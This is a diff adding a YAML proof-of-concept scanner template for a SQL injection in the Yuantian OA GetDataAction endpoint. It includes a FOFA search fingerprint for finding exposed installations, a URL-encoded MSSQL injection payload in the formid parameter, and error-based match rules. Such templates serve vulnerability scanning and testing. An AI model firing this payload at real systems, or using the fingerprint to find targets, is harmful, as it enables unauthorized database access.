@@ -1,0 +1,17 @@
+id: poc-yaml-yuantian-oa-getdataaction-sqli
+info:
+  name: 源天OA GetDataAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 源天OA
+  fofa: body="/vmain/login.jsp"
+variables:
+  t1: random_int(100,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))))%20AND%20%27a%27=%27a
+  expression: status_code == 500 && contains(body,"转换成数据类型 int 时失败") && contains(body,"在将
+    nvarchar 值") && contains(body,t2)
+transport: http
